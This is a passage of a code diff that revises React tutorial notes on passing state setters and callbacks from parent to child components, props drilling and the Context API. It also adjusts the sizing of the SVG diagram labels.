-      &lt;button onClick={handleReturnHome} className="btn-primary"&gt;
-        Return to Home Page
-      &lt;/button&gt;
-
-      {/* Numeric arguments traverse browser history stack */}
-      &lt;div className="flex gap-2 pt-4"&gt;
-        &lt;button onClick={() =&gt; navigate(-1)} className="btn-secondary"&gt;
-          ← History Back
-        &lt;/button&gt;
-        &lt;button onClick={() =&gt; navigate(1)} className="btn-secondary"&gt;
-          History Forward →
-        &lt;/button&gt;
-      &lt;/div&gt;
-    &lt;/div&gt;
-  )
-}
-
-export default About</code></pre>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -8099,8 +8790,8 @@ export default About</code></pre>
                   <!-- Dynamic Params -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">DYNAMIC PARAMETER (useParams)</text>
+                    <rect x="15" y="15" width="242" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="136" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">DYNAMIC PARAMETER (useParams)</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title">URL Token Deserialization</text>
 
                     <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -8113,8 +8804,8 @@ export default About</code></pre>
                   <!-- useNavigate -->
                   <g transform="translate(455, 20)">
                     <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">IMPERATIVE ROUTING (useNavigate)</text>
+                    <rect x="15" y="15" width="264" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="147" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">IMPERATIVE ROUTING (useNavigate)</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title">Browser History Stack Control</text>
 
                     <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -8130,33 +8821,37 @@ export default About</code></pre>
         }
       ]
     },
+
+    /* ═══════════════════════════════════════════════════════════════
+       TOPIC 41
+       ═══════════════════════════════════════════════════════════════ */
     {
-      id: 'react-41',
-      number: 41,
-      shortLabel: 'React 41',
-      title: 'Updating Parent State from a Child Component (Child-to-Parent Data Flow)',
-      summary: 'Mastering unidirectional state inversion: How a child component triggers updates in a parent component by passing setter callbacks via props, handling event bindings cleanly, and identifying when Props Drilling necessitates Context API.',
-      subtopicLabels: [
-        '41.1 Child-to-Parent State',
-        '41.2 App to Navbar Callback',
-        '41.3 Props Drilling & Gotchas'
-      ],
+      id: "react-41-child-to-parent-data-flow",
+      number: "41",
+      shortLabel: "Child-to-Parent Data Flow",
+      title: "Updating Parent State from a Child Component (Child-to-Parent Data Flow)",
+      summary: "Unidirectional data flow principles, inverted data flow mechanics via callback props, shallow callback delegation, and recognizing the props drilling bottleneck requiring Context API.",
+      subtopicLabels: ["41.1 Unidirectional Data Flow & State Inversion", "41.2 Passing State Setters & Callback Handlers", "41.3 Props Drilling Anti-Pattern vs. Context API"],
       diagramCount: 2,
       sections: [
         {
-          id: 'react-41-1',
-          num: '41.1',
-          title: 'The Core Concept: Callback Setter Inversion',
+          num: "41.1",
+          title: "Unidirectional Data Flow & The Callback Inversion Principle",
           content: `
             <p>
-              In React, props always flow strictly in a <strong>unidirectional (top-down)</strong> direction: from Parent down to Child. A child component receives props as read-only values and is strictly forbidden from mutating them directly.
+              In React's architectural philosophy, data strictly flows in one direction: <strong>downwards from parent components to child components via props</strong> (Unidirectional Data Flow). A child component cannot directly reach into a parent component to mutate its variables.
             </p>
-            <p>
-              However, modern UI patterns frequently require user actions inside a child component (e.g., clicking a theme switch button in a <code>&lt;Navbar /&gt;</code>) to modify state owned by the root parent (<code>&lt;App /&gt;</code>).
-            </p>
-            <p>
-              <strong>The Architecture:</strong> The parent maintains the state variable and its setter function (<code>const [theme, setTheme] = useState('light')</code>). It passes the setter function down to the child as a prop. When the child detects a user event, it invokes that callback, causing the parent to update its state and trigger a top-down re-render.
-            </p>
+
+            <ul class="notes-bullet-list">
+              <li><strong>The Architectural Question:</strong> How does a child component notify its parent of a change (e.g. user clicks "Logout" in a child Navbar, but the <code>user</code> state is owned by the top-level <code>App</code> component)?</li>
+              <li><strong>The Solution — Callback Inversion:</strong>
+                <ul class="notes-sub-list">
+                  <li>The parent defines the state and a function to update that state.</li>
+                  <li>The parent passes that function <strong>down to the child as a prop</strong>.</li>
+                  <li>When the user interacts with the child, the child invokes that function, optionally passing payload data back up to the parent!</li>
+                </ul>
+              </li>
+            </ul>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -8168,8 +8863,8 @@ export default About</code></pre>
                   <!-- Parent Box -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="380" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">PARENT COMPONENT (App)</text>
+                    <rect x="15" y="15" width="189" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="109.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">PARENT COMPONENT (App)</text>
                     <text x="190" y="58" text-anchor="middle" class="svg-title">Single Source of Truth</text>
 
                     <rect x="15" y="74" width="350" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -8182,8 +8877,8 @@ export default About</code></pre>
                   <!-- Child Box -->
                   <g transform="translate(475, 20)">
                     <rect x="0" y="0" width="380" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">CHILD COMPONENT (Navbar)</text>
+                    <rect x="15" y="15" width="204" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="117" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">CHILD COMPONENT (Navbar)</text>
                     <text x="190" y="58" text-anchor="middle" class="svg-title">Event Consumer &amp; Dispatcher</text>
 
                     <rect x="15" y="74" width="350" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -8201,68 +8896,78 @@ export default About</code></pre>
           `
         },
         {
-          id: 'react-41-2',
-          num: '41.2',
-          title: 'Implementation: Parent (App.jsx) to Child (Navbar.jsx)',
+          num: "41.2",
+          title: "Passing State Setters & Callback Handlers in Practice",
           content: `
-            <pre class="notes-code-block"><code>// 1. App.jsx (Parent: Owns State & Passes Setter)
-import React, { useState } from 'react'
-import Navbar from './components/Navbar'
+            <p>
+              There are two primary patterns for child-to-parent communication:
+            </p>
 
-const App = () => {
-  // Master state lives in parent
-  const [theme, setTheme] = useState('light')
+            <ul class="notes-bullet-list">
+              <li><strong>Pattern A: Passing the State Dispatcher Directly:</strong>
+                <pre class="notes-code-block"><code>// Parent:
+const [user, setUser] = useState('Sarthak');
+return &lt;Navbar setUser={setUser} /&gt;;
+
+// Child:
+function Navbar({ setUser }) {
+  return &lt;button onClick={() => setUser('Guest')}&gt;Log Out&lt;/button&gt;;
+}</code></pre>
+              </li>
+              <li><strong>Pattern B: Passing a Semantic Callback Function (Senior Standard):</strong>
+                <ul class="notes-sub-list">
+                  <li>Passing <code>setUser</code> directly tightly couples the child to the parent's state implementation. A more maintainable approach is passing a semantic handler like <code>onLogout</code>:</li>
+                </ul>
+                <pre class="notes-code-block"><code>// Parent (App.jsx):
+import React, { useState } from 'react';
+import Navbar from './Navbar';
+
+function App() {
+  const [currentUser, setCurrentUser] = useState('Sarthak');
+
+  const handleUserLogout = () => {
+    console.log('Logging out user...');
+    setCurrentUser(null);
+  };
 
   return (
-    &lt;div className="app-shell p-6"&gt;
-      &lt;h1 className="text-xl font-bold mb-4"&gt;Current Theme: {theme}&lt;/h1&gt;
-
-      {/* Pass both the reactive value AND the setter function down as props */}
-      &lt;Navbar theme={theme} setTheme={setTheme} /&gt;
+    &lt;div className="min-h-screen bg-canvas"&gt;
+      {/* Pass handler down as semantic prop */}
+      &lt;Navbar user={currentUser} onLogout={handleUserLogout} /&gt;
+      &lt;main className="p-6"&gt;
+        {currentUser ? &lt;h2&gt;Welcome back, {currentUser}!&lt;/h2&gt; : &lt;h2&gt;Please log in.&lt;/h2&gt;}
+      &lt;/main&gt;
     &lt;/div&gt;
-  )
+  );
 }
 
-export default App</code></pre>
-
-            <pre class="notes-code-block"><code>// 2. components/Navbar.jsx (Child: Consumes Props & Triggers Setter)
-import React from 'react'
-
-const Navbar = (props) => {
-  const changeTheme = () => {
-    // Calls the parent function to invert/mutate App's state
-    props.setTheme(props.theme === 'light' ? 'dark' : 'light')
-  }
-
-  return (
-    &lt;header className="p-4 border rounded flex items-center justify-between"&gt;
-      &lt;span className="font-semibold"&gt;Brand Navigation&lt;/span&gt;
-      
-      {/* Event listener triggers callback invocation */}
-      &lt;button 
-        onClick={changeTheme}
-        className="px-4 py-2 border rounded font-mono"
-      &gt;
-        Toggle Theme
-      &lt;/button&gt;
-    &lt;/header&gt;
-  )
-}
-
-export default Navbar</code></pre>
+export default App;</code></pre>
+              </li>
+            </ul>
           `
         },
         {
-          id: 'react-41-3',
-          num: '41.3',
-          title: 'Event Gotchas & The Props Drilling Limitation',
+          num: "41.3",
+          title: "The Props Drilling Anti-Pattern vs. React Context API",
           content: `
             <p>
-              Two essential architectural caveats every engineer must know:
+              While passing callbacks works cleanly across 1 or 2 component levels (e.g. <code>App &rarr; Navbar</code>), it breaks down in deep component hierarchies:
             </p>
-            <ul>
-              <li><strong>Event Listener Gotcha (<code>onClick</code> vs <code>onChange</code>):</strong> Always attach <code>onClick</code> to button elements. Attaching <code>onChange</code> to a <code>&lt;button&gt;</code> will fail silently because <code>onChange</code> is exclusively dispatched by form control inputs (<code>&lt;input&gt;</code>, <code>&lt;select&gt;</code>, <code>&lt;textarea&gt;</code>).</li>
-              <li><strong>When Callback Inversion Breaks Down (Props Drilling):</strong> Passing setters through props is clean and explicit for 1–2 component levels (<code>App</code> → <code>Navbar</code>). But when deep leaf components need state (e.g., <code>App</code> → <code>Dashboard</code> → <code>Sidebar</code> → <code>UserPanel</code> → <code>ThemeButton</code>), intermediate components must manually thread props they never use. This architectural anti-pattern is called <strong>Props Drilling</strong>, and is solved globally via <strong>React Context API</strong>.</li>
+
+            <ul class="notes-bullet-list">
+              <li><strong>What is "Props Drilling"?</strong>
+                <ul class="notes-sub-list">
+                  <li>When you have to pass a prop through 4, 5, or 6 intermediate components that do not need the data themselves, simply to reach a deeply nested leaf component:
+                    <br><code>App &rarr; Dashboard &rarr; SidePanel &rarr; UserWidget &rarr; LogoutButton</code>
+                  </li>
+                  <li>Every intermediate component is burdened with unused props, cluttering code and making refactoring a maintenance nightmare.</li>
+                </ul>
+              </li>
+              <li><strong>The Production Solution:</strong>
+                <ul class="notes-sub-list">
+                  <li>When data needs to be accessed globally across unrelated components (theme, authenticated user, shopping cart), use the <strong>React Context API</strong> (<code>createContext</code>, <code>useContext</code>) or state management stores (Zustand, Redux Toolkit) to broadcast data directly across the tree without drilling!</li>
+                </ul>
+              </li>
             </ul>
 
             <figure class="diagram-frame">
@@ -8275,8 +8980,8 @@ export default Navbar</code></pre>
                   <!-- Clean 1-Level -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">SHALLOW CALLBACK (1-2 LEVELS)</text>
+                    <rect x="15" y="15" width="242" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="136" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-primary); font-weight:700;">SHALLOW CALLBACK (1-2 LEVELS)</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title">Direct Setter Delegation</text>
 
                     <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -8289,8 +8994,8 @@ export default Navbar</code></pre>
                   <!-- Deep Drilling -->
                   <g transform="translate(455, 20)">
                     <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
-                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--border)" stroke-width="1.2"/>
-                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">PROPS DRILLING (4+ LEVELS)</text>
+                    <rect x="15" y="15" width="219" height="22" rx="4" fill="var(--bg-surface)" stroke="var(--border)" stroke-width="1.2"/>
+                    <text x="124.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">PROPS DRILLING (4+ LEVELS)</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title">Architectural Anti-Pattern</text>
 
                     <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
